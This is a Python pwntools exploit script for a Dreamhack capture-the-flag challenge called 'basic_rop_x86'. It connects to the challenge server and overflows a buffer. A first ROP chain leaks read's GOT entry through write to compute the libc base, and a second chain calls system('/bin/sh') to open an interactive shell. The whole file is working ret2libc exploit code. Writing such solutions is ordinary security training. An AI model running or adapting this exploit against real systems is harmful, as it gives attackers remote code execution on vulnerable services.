#! /bin/usr/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

binary = "basic_rop_x86"
p = remote("host3.dreamhack.games", 23049)
e = ELF(binary)
r = ROP(e)
libc = ELF("libc.so.6")

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols['main']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
binsh = list(libc.search(b'/bin/sh'))[0]

pop3ret = 0x08048689
p1ret = 0x0804868b

payload = b'A'* 0x48

#write(1, read_got, 4)
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# return to main
payload += p32(main)
p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u32(p.recvn(4))
lb = read - read_offset
system = lb + system_offset
binsh = binsh + lb

payload = b'A' * 0x48

#system("/bin/sh")
payload += p32(system)
payload += p32(p1ret) + p32(binsh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()

